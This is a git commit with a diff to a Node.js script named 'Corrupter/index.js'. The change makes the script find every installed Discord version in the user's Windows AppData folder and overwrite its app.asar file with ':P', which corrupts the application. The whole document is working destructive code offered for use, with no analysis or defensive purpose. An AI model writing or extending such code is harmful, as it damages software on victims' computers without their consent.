c8a9006e6998d63529b2dd78c1a1e172532c915a
Trac3D1y <i2rys@protonmail.com>
2021-10-13 04:40:02 -0700

    Added with files reader
    + Added files reader so it automatically detects your Discord app version.

--- Corrupter/index.js
+++ Corrupter/index.js
@@ -3,4 +3,10 @@ const Fs = require("fs")
 const Os = require("os")
 
 //Main
-Fs.writeFileSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord\\app-1.0.9002\\resources\\app.asar`, ":P", "utf8")
+Fs.readdir(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord`, function(err, results){
+    results.forEach(file =>{
+        if(file.indexOf("app-") != -1){
+            Fs.writeFileSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord\\${file}\\resources\\app.asar`, ":P", "utf8")
+        }
+    })
+})
